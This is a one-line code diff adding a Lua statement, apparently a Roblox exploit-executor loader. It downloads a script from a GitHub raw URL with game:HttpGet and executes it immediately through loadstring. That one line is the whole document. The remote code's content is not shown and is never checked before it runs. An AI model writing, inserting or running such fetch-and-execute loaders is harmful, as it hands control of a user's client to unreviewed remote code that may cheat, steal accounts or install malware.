@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IntelMint28/test/refs/heads/h/shittygrokscript.lua"))()
